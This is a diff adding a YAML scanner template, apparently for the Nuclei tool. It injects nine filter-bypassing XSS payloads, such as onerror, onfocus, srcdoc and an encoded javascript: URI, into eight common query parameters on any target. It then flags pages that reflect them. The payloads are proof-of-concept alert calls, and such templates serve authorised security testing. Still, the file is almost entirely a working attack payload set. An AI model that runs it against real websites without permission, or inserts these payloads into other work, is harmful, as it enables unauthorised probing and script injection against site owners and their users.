@@ -1,0 +1,47 @@
+id: nawab-xss-auto-input-scanner
+
+info:
+  name: Nawab-XSS-Auto-Input-Scanner
+  author: thenawabx
+  severity: high
+  description: Automatically injects XSS payloads into all query parameters and monitors response body.
+  tags: xss, bypass, nawab-elite
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q={{xss_payloads}}"
+      - "{{BaseURL}}/?id={{xss_payloads}}"
+      - "{{BaseURL}}/?search={{xss_payloads}}"
+      - "{{BaseURL}}/?query={{xss_payloads}}"
+      - "{{BaseURL}}/?name={{xss_payloads}}"
+      - "{{BaseURL}}/?user={{xss_payloads}}"
+      - "{{BaseURL}}/?callback={{xss_payloads}}"
+      - "{{BaseURL}}/?redirect={{xss_payloads}}"
+
+    payloads:
+      xss_payloads:
+        - "<video><source/onerror=confirm(1)>"
+        - "<audio/src/onerror=prompt(1)>"
+        - "<input/onfocus=confirm(1)/autofocus>"
+        - "<body/onpageshow=alert?.(1)>"
+        - "<math><x/href=\"javascript:alert(1)\">CLICK"
+        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
+        - "<marquee/onstart=confirm(1)>"
+        - "<style/onload=confirm(1)>"
+        - "j%0Avascript:alert(1)"
+
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: "!!! [FOUND] XSS-VULNERABLE: INPUT-FIELD-EXPLOITED !!!"
+        regex:
+          - "(?i)(<video><source/onerror=|<audio/src/onerror=|<input/onfocus=|<body/onpageshow=|<math><x/href=|<iframe/srcdoc=|<marquee/onstart=)"
+        part: body
+
+      - type: regex
+        name: "!!! [FOUND] XSS-VULNERABLE: ENCODED-REFLECTED !!!"
+        regex:
+          - "(?i)(j%0Avascript:alert)"
+        part: body
